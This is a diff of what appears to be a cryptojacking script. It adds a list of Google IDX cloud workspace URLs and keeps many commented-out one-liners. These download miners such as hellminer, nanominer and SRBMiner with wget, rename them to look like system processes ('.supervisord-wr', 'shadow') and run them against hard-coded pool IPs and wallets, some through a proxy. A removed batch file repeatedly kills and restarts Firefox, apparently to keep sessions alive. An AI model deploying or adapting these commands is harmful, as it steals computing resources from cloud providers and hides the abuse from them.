@@ -1,3 +1,15 @@
+https://idx.google.com/u/0/testify-micro-3012606
+https://idx.google.com/u/0/gongga-curu-1052658
+https://idx.google.com/u/0/farako-poliko-1227572
+https://idx.google.com/u/0/farva-burit-4578181
+https://idx.google.com/u/0/kolom-jaaka-435071
+https://idx.google.com/u/0/aola-werta-3870114
+https://idx.google.com/u/0/serapo-juluku-1217121
+https://idx.google.com/u/0/rona-maya-907966
+https://idx.google.com/u/0/hulaka-bora-7664538
+https://idx.google.com/u/0/rungka-muyu-6049387
+https://idx.google.com/u/0/sena-mangku-8019931
+
 #!/bin/bash
 #wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && rm -rf hellminer_linux64.tar.gz && chmod +x ./hellminer && mv hellminer .supervisord-wr && ./.supervisord-wr -c stratum+tcp://18.119.69.12:5040 -u RWsSEGpV2E6yYa3UZ8fTE17FE3ZzMWzRAs."$(TZ='Asia/Jakarta' date +"%d-%b-%Y_Jam-%H-%M")-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)" --cpu 8
 #wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz && tar -xf nanominer-linux-3.9.3.tar.gz && rm -rf nanominer-linux-3.9.3.tar.gz && chmod +x ./nanominer && mv nanominer .supervisord-wr && ./.supervisord-wr -algo Verushash -pool1 18.119.69.12:5040 -wallet RWsSEGpV2E6yYa3UZ8fTE17FE3ZzMWzRAs -coin VRSC -rigName "$(TZ='Asia/Jakarta' date +"%d%m%y%H%M")$(head /dev/urandom | tr -dc A-Za-z | head -c 7 | tr 'a-z' 'A-Z')"
@@ -30,46 +42,3 @@
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8XYTN --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI shadow && ./shadow --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI shadow && ./shadow --algorithm yespower2b --disable-gpu --pool 103.249.70.7:7445 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=6Xmbc --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6
-
-@echo off
-
-:: Fungsi untuk menutup Firefox
-:CloseFirefox
-echo Menutup Firefox...
-taskkill /IM firefox.exe /F
-timeout /t 5 > nul
-goto :eof
-
-:: Fungsi untuk membuka Firefox
-:OpenFirefox
-echo Membuka Firefox...
-start firefox
-goto :eof
-
-:: Menjalankan urutan perintah
-call :CloseFirefox
-call :OpenFirefox
-timeout /t 300 > nul
-
-call :CloseFirefox
-call :OpenFirefox
-timeout /t 300 > nul
-
-call :CloseFirefox
-call :OpenFirefox
-timeout /t 300 > nul
-
-call :CloseFirefox
-call :OpenFirefox
-timeout /t 300 > nul
-
-call :CloseFirefox
-call :OpenFirefox
-timeout /t 5400 > nul
-
-call :CloseFirefox
-call :OpenFirefox
-
-:: Selesai
-echo Semua operasi selesai.
-pause
